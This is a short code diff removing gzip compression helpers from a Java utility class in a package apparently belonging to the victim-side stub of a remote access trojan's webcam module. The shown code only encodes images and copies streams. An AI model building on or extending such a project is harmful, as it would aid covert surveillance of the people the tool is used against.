@@ -1,12 +1,10 @@
 package pro.jrat.stub.webcam;
 
 import java.awt.image.BufferedImage;
-import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.OutputStream;
-import java.util.zip.GZIPOutputStream;
 
 import javax.imageio.IIOImage;
 import javax.imageio.ImageIO;
@@ -28,20 +26,6 @@ public class Utils {
 		writer.write(null, new IIOImage(image, null, null), writeParam);
 
 		return output.toByteArray();
-	}
-	
-	public static byte[] compress(InputStream is) throws Exception {
-		ByteArrayOutputStream baos = new ByteArrayOutputStream();
-		GZIPOutputStream gzos = new GZIPOutputStream(baos);
-		copy(is, gzos);
-		
-		gzos.close();
-		
-		return baos.toByteArray();
-	}
-
-	public static byte[] compress(byte[] input) throws Exception {
-		return compress(new ByteArrayInputStream(input));
 	}
 	
 	public static long copy(InputStream input, OutputStream output) throws Exception {
